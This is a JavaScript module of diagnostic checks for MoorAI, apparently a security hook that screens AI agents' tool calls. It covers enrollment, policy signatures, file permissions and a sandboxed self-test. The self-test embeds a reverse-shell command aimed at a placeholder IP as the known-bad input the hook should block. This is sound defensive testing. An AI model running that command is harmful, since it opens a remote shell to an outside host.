// The non-host doctor checks: node, enrollment, console, policy, posture, break-glass, state dir, and
// the live self-test. Every check returns { id, group, title, status: ok|warn|fail|skip, summary, fix? }.
// Nothing here writes to the device's state or posts anything: the policy loader and the hook run in a
// sandbox copy (cli/doctor-sandbox.mjs), and the only network call is the GET the hook itself makes.
import { readFileSync, statSync, existsSync } from "node:fs";
import { fileURLToPath } from "node:url";
import { join, dirname } from "node:path";
import os from "node:os";
import { threatActionFor, isEnrolled } from "./hook-core.mjs";
import { evaluate } from "./agent-hooks/shim.mjs";
import { STATE_DIR, LATCH_DIR } from "./state-dirs.mjs";
import { INTENT_FILE, INTENT_KEY_FILE } from "./intent-alignment.mjs";
import { KEY_FILE as FP_KEY_FILE, CACHE_FILE as FP_CACHE_FILE } from "./instruction-fingerprints.mjs";
import { CACHE_FILE as REPUTATION_FILE } from "./mcp-reputation.mjs";
import { makeSandbox, DEAD_SERVER } from "./doctor-sandbox.mjs";
import { fingerprint, configSource } from "./doctor-policy.mjs";

const ROOT = join(dirname(fileURLToPath(import.meta.url)), "..");
const tilde = (p) => String(p).replace(os.homedir(), "~");

export function pkg() { try { return JSON.parse(readFileSync(join(ROOT, "package.json"), "utf8")); } catch { return {}; } }

function versionAtLeast(have, want) {
  const a = String(have).replace(/^v/, "").split(".").map(Number), b = String(want).split(".").map(Number);
  for (let i = 0; i < 3; i++) { if ((a[i] || 0) > (b[i] || 0)) return true; if ((a[i] || 0) < (b[i] || 0)) return false; }
  return true;
}
export function checkNode(p = pkg(), version = process.version) {
  const base = { id: "node", group: "runtime", title: "Node.js" };
  const range = p.engines && p.engines.node;
  if (!range) return { ...base, status: "ok", summary: `${version} (package.json declares no engines.node minimum)` };
  const m = String(range).match(/>=?\s*v?(\d+(?:\.\d+){0,2})/);
  if (!m) return { ...base, status: "warn", summary: `${version}; cannot interpret engines.node "${range}"` };
  return versionAtLeast(version, m[1])
    ? { ...base, status: "ok", summary: `${version} satisfies engines.node "${range}"` }
    : { ...base, status: "fail", summary: `${version} is older than engines.node "${range}"`, fix: `install Node.js ${m[1]} or newer` };
}

export function checkEnrollment(config, eff, home = os.homedir()) {
  const base = { id: "enrollment", group: "enrollment", title: "Enrollment" };
  const src = configSource(home);
  const enrolled = isEnrolled(config);
  const token = enrolled ? `present (sha256:${fingerprint(config.installToken)})` : "absent";
  const where = src ? tilde(src.path) : "no config.json (env/localhost defaults)";
  const mode = eff.coach ? "coach" : "enforce";
  const details = { config: where, tenant: config.tenant, serverUrl: config.serverUrl, installToken: token, mode };
  const loose = src && process.platform !== "win32" && enrolled && (src.mode & 0o077);
  const s = `${enrolled ? "enrolled" : "not enrolled"} · tenant ${config.tenant} · token ${token} · ${mode} mode`;
  if (!enrolled && !eff.coach) return { ...base, status: "ok", summary: `${s} (fail-closed management posture keeps enforcement on without a token)`, details };
  if (!enrolled) return { ...base, status: "warn", summary: `${s}: MoorAI detects and coaches but never blocks`, fix: "enroll the device (desktop app setup screen, or the MDM config.json with serverUrl/tenant/installToken)", details };
  if (loose) return { ...base, status: "warn", summary: `${s}; ${where} holding the token is mode ${(src.mode).toString(8)}, readable by other users`, fix: `chmod 600 ${where}`, details };
  return { ...base, status: "ok", summary: s, details };
}

// The hook's own request: GET /api/policy?tenant=… with X-Install-Token. Body is discarded.
export async function checkConsole(config, { offline = false, timeoutMs = 3000 } = {}) {
  const base = { id: "console", group: "enrollment", title: "Console reachable" };
  if (offline) return { ...base, status: "skip", summary: "skipped (--offline)" };
  if (!isEnrolled(config)) return { ...base, status: "skip", summary: "not enrolled: there is no console to reach" };
  const url = `${config.serverUrl}/api/policy?tenant=${encodeURIComponent(config.tenant)}`;
  const t0 = Date.now();
  try {
    const r = await fetch(url, { method: "GET", headers: { "X-Install-Token": config.installToken }, signal: AbortSignal.timeout(timeoutMs) });
    await r.arrayBuffer().catch(() => {});
    const ms = Date.now() - t0;
    if (r.ok) return { ...base, status: "ok", summary: `${config.serverUrl} answered ${r.status} in ${ms}ms` };
    if (r.status === 401 || r.status === 403) return { ...base, status: "fail", summary: `${config.serverUrl} rejected the install token (${r.status})`, fix: "re-enroll the device with a current install token" };
    return { ...base, status: "warn", summary: `${config.serverUrl} answered ${r.status} in ${ms}ms; the hook will run on its cached policy`, fix: "check the console URL in config.json" };
  } catch (e) {
    return { ...base, status: "warn", summary: `${config.serverUrl} unreachable after ${Date.now() - t0}ms (${e && e.name === "TimeoutError" ? "timeout" : "connection failed"}); the hook runs on its cached or last-known-good policy`, fix: "check network/VPN, or re-run with --offline" };
  }
}

export function checkPolicy(loaded, eff, config) {
  const base = { id: "policy", group: "policy", title: "Policy" };
  if (loaded.error) return { ...base, status: "fail", summary: `policy loader failed: ${loaded.error}` };
  const trust = `${loaded.trustMode}${loaded.trustKeys && loaded.trustKeys.length ? ` (${loaded.trustKeys.length} key${loaded.trustKeys.length > 1 ? "s" : ""}: ${loaded.trustKeys.join(", ")})` : ""}`;
  const details = { source: loaded.source, trust, signature: loaded.signature || "n/a", signed: loaded.signed, iat: loaded.iat, digest: loaded.digest, rejected: loaded.rejected, enforcing: eff.basis, loaderMs: loaded.ms };
  const rej = (loaded.rejected || []).map((r) => `${r.source}:${r.status}`);
  if (rej.length) return { ...base, status: "fail", summary: `rejected policy material (${rej.join(", ")}) — the hook reports this as tampering; enforcing ${eff.basis}`, fix: "restore the console-signed policy (delete ~/.moorai/hook-policy.json and let the hook re-fetch), or check the pin/anchor for this tenant", details };
  if (loaded.absence && loaded.absence.suspicious) return { ...base, status: "fail", summary: `policy-key pin absent on a device with prior operation (${(loaded.absence.evidence || []).join(", ")})`, fix: "reconnect to the console so the pin re-forms; ship /etc/moorai/policy.pub to remove the window", details };
  if (!loaded.policy) {
    const st = isEnrolled(config) ? "warn" : "ok";
    return { ...base, status: st, summary: `no org policy (${loaded.source}); enforcing ${eff.basis} · trust ${trust}`, ...(st === "warn" ? { fix: "publish a policy for this tenant in the console, or check connectivity" } : {}), details };
  }
  const sig = loaded.signature === "ok" ? `signature verifies (${trust})` : loaded.signature === "unanchored" ? `accepted UNVERIFIED — no anchor or pin (${loaded.signed ? "signed, key not yet pinned" : "unsigned"})` : `signature ${loaded.signature}`;
  const summary = `${loaded.source} policy${loaded.iat ? ` iat ${loaded.iat}` : ""} · ${sig} · digest ${loaded.digest}`;
  if (loaded.signature === "unanchored") return { ...base, status: "warn", summary, fix: "ship the tenant key to /etc/moorai/policy.pub (or MOORAI_POLICY_PUBKEY); an unanchored, unpinned device accepts any policy file", details };
  if (loaded.source === "last-known-good") return { ...base, status: "warn", summary: `${summary} — live and cached copies were unusable`, details };
  return { ...base, status: "ok", summary, details };
}

export function checkPosture(eff) {
  const base = { id: "posture", group: "policy", title: "Offline posture" };
  const p = eff.posture;
  const details = { posture: p.posture, hardenedBy: p.hardenedBy, sources: p.sources };
  if (p.downgradeAttempt && p.downgradeAttempt.length) return { ...base, status: "fail", summary: `${p.posture}; downgrade asserted by ${p.downgradeAttempt.join(", ")} (refused, reported as tampering)`, fix: "remove the fail-open value from the named source", details };
  if (p.evidenceMissing) return { ...base, status: "warn", summary: `${p.posture}; one user-scope posture copy is missing (reported as evidence-missing)`, details };
  return { ...base, status: "ok", summary: p.posture === "fail-closed" ? `fail-closed (hardened by ${p.hardenedBy.join(", ")})` : "fail-open (no policy → built-in defaults, never a lockout)", details };
}

export function checkBreakGlass(eff) {
  const base = { id: "break-glass", group: "policy", title: "Break-glass" };
  const s = eff.breakGlass.status;
  if (s === "absent") return { ...base, status: "ok", summary: "no marker" };
  if (eff.breakGlass.active) return { ...base, status: "warn", summary: `operator-signed marker ACTIVE${eff.allowAll ? ": the hook currently allows every call" : " (only takes effect on a fail-closed device)"}`, fix: "delete ~/.moorai/break-glass once the incident is over" };
  if (s === "expired") return { ...base, status: "warn", summary: "expired marker present (grants nothing)", fix: "delete ~/.moorai/break-glass" };
  return { ...base, status: "fail", summary: `marker present but rejected (${s}) — grants nothing and is reported as tampering`, fix: "delete ~/.moorai/break-glass and find out what wrote it" };
}

// Files the code creates with mode 0600 (intent-alignment.mjs, instruction-fingerprints.mjs,
// data/agency-sign.mjs), and caches the hook reads on its hot path.
const PRIVATE_FILES = [INTENT_KEY_FILE, INTENT_FILE, FP_KEY_FILE, FP_CACHE_FILE, "agency-ed25519.key"];
const CACHES = [FP_CACHE_FILE, INTENT_FILE, REPUTATION_FILE];
export function checkStateDir(stateDir = STATE_DIR) {
  const base = { id: "state", group: "state", title: "State directory" };
  let st;
  try { st = statSync(stateDir); } catch { return { ...base, status: "warn", summary: `${tilde(stateDir)} does not exist — the hook has not run on this device yet`, fix: "run any agent tool call with MoorAI registered, then re-run doctor" }; }
  if (!st.isDirectory()) return { ...base, status: "fail", summary: `${tilde(stateDir)} is not a directory` };
  const problems = [], warns = [], seen = [];
  if (process.platform !== "win32") {
    for (const n of PRIVATE_FILES) {
      let fst; try { fst = statSync(join(stateDir, n)); } catch { continue; }
      seen.push(n);
      if (fst.mode & 0o077) problems.push(`${n} is mode ${(fst.mode & 0o777).toString(8)}, expected 600`);
    }
  }
  for (const n of CACHES) {
    let raw; try { raw = readFileSync(join(stateDir, n), "utf8"); } catch (e) { if (e.code !== "ENOENT") warns.push(`${n} unreadable (${e.code})`); continue; }
    try { JSON.parse(raw); } catch { warns.push(`${n} is not valid JSON (the hook treats it as empty)`); }
  }
  const latch = existsSync(LATCH_DIR) ? "" : `; latch dir ${tilde(LATCH_DIR)} not created yet`;
  const details = { dir: tilde(stateDir), privateFilesChecked: seen, latch: tilde(LATCH_DIR) };
  if (problems.length) return { ...base, status: "fail", summary: problems.join("; "), fix: `chmod 600 ${problems.map((p) => tilde(join(stateDir, p.split(" ")[0]))).join(" ")}`, details };
  if (warns.length) return { ...base, status: "warn", summary: warns.join("; "), fix: "delete the unreadable cache; the hook rebuilds it", details };
  return { ...base, status: "ok", summary: `${tilde(stateDir)} present; ${seen.length ? `${seen.join(", ")} are 0600` : "no key files yet"}; caches readable${latch}`, details };
}

// ---- live self-test ----
export const SELFTEST_BENIGN = "ls -la";
export const SELFTEST_BAD = "bash -i >& /dev/tcp/198.51.100.7/4444 0>&1"; // #54, built-in "block"
const BAD_THREAT = 54;

export function expectedBad(eff) {
  if (eff.allowAll) return { decision: "allow", coach: false, why: "break-glass active" };
  const act = threatActionFor(eff.policy, BAD_THREAT);
  const acts = { block: "deny", kill: "deny", justify: "ask" };
  if (!acts[act]) return { decision: "allow", coach: false, why: `policy sets #${BAD_THREAT} to "${act}"`, softened: true };
  if (eff.coach) return { decision: "allow", coach: true, why: `#${BAD_THREAT} "${act}", coach mode` };
  return { decision: acts[act], coach: false, why: `#${BAD_THREAT} "${act}"` };
}

// Runs the real hook through the adapters' own verdict parser (cli/agent-hooks/shim.mjs evaluate) in
// a sandbox whose config points at a closed port, with a placeholder token when the device is enrolled.
export function checkSelfTest(config, eff, { timeoutMs = 20000 } = {}) {
  const base = { id: "selftest", group: "selftest", title: "Live self-test" };
  const sb = makeSandbox({ config: { serverUrl: DEAD_SERVER, tenant: config.tenant, ...(isEnrolled(config) ? { installToken: "moorai-doctor-placeholder" } : {}) } });
  try {
    const run = (command) => {
      const t0 = Date.now();
      const v = evaluate({ hook_event_name: "PreToolUse", tool_name: "Bash", tool_input: { command }, session_id: "moorai-doctor-selftest", cwd: sb.proj }, { env: sb.env(), timeoutMs });
      return { ...v, ms: Date.now() - t0 };
    };
    const good = run(SELFTEST_BENIGN);
    const bad = run(SELFTEST_BAD);
    const want = expectedBad(eff);
    const details = { benign: { decision: good.decision, coach: !!good.coach, ms: good.ms }, knownBad: { decision: bad.decision, coach: !!bad.coach, ms: bad.ms, reason: bad.reason || bad.coach || "" }, expected: want };
    const lat = `latency ${good.ms}ms / ${bad.ms}ms`;
    const problems = [];
    if (good.decision !== "allow" || good.coach) problems.push(`benign "${SELFTEST_BENIGN}" got ${good.decision}${good.coach ? " + coach note" : ""}`);
    if (bad.decision !== want.decision) problems.push(`reverse shell got ${bad.decision}, expected ${want.decision} (${want.why})`);
    else if (want.coach && !bad.coach) problems.push("reverse shell was not coached (no MoorAI coach note)");
    if (problems.length) return { ...base, status: "fail", summary: `${problems.join("; ")} · ${lat}`, fix: "run moorai-explain on the input to see which detector/policy decided", details };
    const verdict = want.coach ? "allow + coach note (not enrolled)" : bad.decision;
    if (want.softened) return { ...base, status: "warn", summary: `hook decides, but ${want.why}: a reverse shell is allowed · ${lat}`, details };
    const slow = Math.max(good.ms, bad.ms) > 5000;
    return { ...base, status: slow ? "warn" : "ok", summary: `benign → allow, reverse shell → ${verdict} · ${lat}${slow ? " (slow: hosts time hooks out at 30–60s)" : ""}`, details };
  } finally { sb.cleanup(); }
}
